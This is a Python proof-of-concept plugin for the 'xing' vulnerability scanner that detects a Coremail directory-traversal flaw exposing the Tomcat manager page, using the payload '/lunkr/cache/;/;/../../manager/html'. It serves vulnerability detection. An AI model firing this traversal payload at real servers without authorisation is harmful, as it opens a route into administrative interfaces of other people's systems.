from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Coremail 目录穿越后台漏洞"
        self.app_name = 'Coremail'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        check_path = "/lunkr/cache/t.html"
        check = b"Coremail"

        url = target + check_path
        conn = http_req(url)

        if check not in conn.content:
            return

        self.logger.debug("found Coremail {}".format(target))

        payload = "/lunkr/cache/;/;/../../manager/html"
        url = target + payload
        conn = http_req(url)

        if b'conf/tomcat-users.xml' not in conn.content:
            return

        if conn.status_code == 401 or conn.status_code == 403:
            self.logger.success("found vul {}".format(url))
            return url


